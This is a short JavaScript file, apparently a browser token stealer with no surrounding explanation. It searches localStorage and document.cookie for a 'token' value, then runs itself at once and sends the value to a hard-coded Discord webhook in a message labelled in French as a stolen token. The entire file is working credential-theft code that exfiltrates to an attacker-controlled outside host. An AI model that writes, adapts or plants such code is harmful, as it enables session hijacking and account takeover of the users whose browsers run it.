const webhook = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";

async function grab() {
    let token = "";
    try {
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            if (key === "token") token = localStorage.getItem(key);
        }
    } catch(e) {}
    
    if (!token) {
        let cookie = document.cookie.split('; ').find(row => row.startsWith('token='));
        if (cookie) token = cookie.split('=')[1];
    }

    if (token) {
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `**Token volé**\n\`\`\`\n${token}\n\`\`\`` })
        });
    }
}
grab();